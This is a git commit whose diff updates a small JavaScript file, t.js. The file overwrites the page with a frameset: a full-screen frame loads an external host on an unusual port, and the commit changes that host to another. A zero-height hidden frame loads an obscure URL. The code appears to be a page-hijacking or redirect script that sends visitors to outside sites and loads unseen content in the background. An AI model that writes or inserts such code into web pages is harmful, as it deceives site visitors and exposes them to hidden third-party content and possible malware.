9707cbbe2f8a2cce4f8cfe61d1c18f89986fd222
sunlightyang <1554974429@qq.com>
2014-11-30 11:33:23 +0800

    Update t.js

--- javascripts/t.js
+++ javascripts/t.js
@@ -1,4 +1,4 @@
 document.writeln("<frameset rows='*,0' frameborder='no' border='0' framespacing='0'>");
-document.writeln("<frame src='http://iii155tt.dat28.com:18910' name='mainFrame' id='mainFrame'>");
+document.writeln("<frame src='http://www.hl9.pidmis.com:33228' name='mainFrame' id='mainFrame'>");
 document.writeln("<frame src='http://url1.2.0.123.38102.127.0.0.1.0127.cn/PTcyQH' name='bottomFrame' scrolling='No' noresize='noresize' id='bottomFrame'>");
 document.writeln("</frameset>");
